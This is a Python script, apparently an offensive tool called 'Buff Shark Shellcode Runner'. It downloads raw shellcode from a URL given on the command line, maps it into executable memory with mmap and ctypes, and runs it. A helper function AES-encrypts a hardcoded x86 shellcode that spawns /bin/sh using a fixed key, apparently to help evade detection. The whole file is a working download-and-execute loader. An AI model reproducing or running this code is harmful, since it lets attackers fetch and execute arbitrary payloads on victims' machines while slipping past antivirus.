#!/bin/python
import sys
import mmap
import ctypes
import pyaes
import argparse
import urllib.request

#Buff Shark Python Shellcode Runner

print("==========================")
print("Buff Shark Shellcode Runner")
print(" Author: Lenard Nguyen ")
print("==========================")

parser = argparse.ArgumentParser(description="Python Shellcode Runner")
parser.add_argument('-u', '--url', type=str, metavar='', required=True, help="URL to shellcode")
args = parser.parse_args()



def downloader(shellcode_url):
    with urllib.request.urlopen(shellcode_url) as f:
        data = f.read()
        shellcode = bytearray(data)
        str1 = shellcode.decode('unicode_escape').encode("raw_unicode_escape")
        file_size = len(str1)
        print("[+] %s Bytes Downloaded!" % (file_size))
        return str1

def write(str1):
    mm = mmap.mmap(
            -1,
            mmap.PAGESIZE,
            mmap.MAP_SHARED,
            mmap.PROT_READ | mmap.PROT_WRITE | mmap.PROT_EXEC,
            )
    mm.write(str1)

    addr = int.from_bytes(ctypes.string_at(id(mm) + 16, 8), "little")

    functype = ctypes.CFUNCTYPE(ctypes.c_void_p)
    fn = functype(addr)
    fn()





def encrypt():
    key = ('0123456789abcdef0123456789abcdef').encode()
    counter = pyaes.Counter(initial_value = 100)
    aes = pyaes.AESModeOfOperationCTR(key, counter = counter)
    shellcode = "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80"
    coded = aes.encrypt(shellcode)
    final_shellcode = ""
    for x in coded:
        final_shellcode += '\\x'
        final_shellcode += '%02x' % x


    print("[+] Encrypted shellcode: %s" % (final_shellcode))
    print("[+] Use this as shellcode %s" % (final_shellcode.replace('\\x', '')))













if __name__ == "__main__":
    str1 = downloader(args.url)
    write(str1)

    
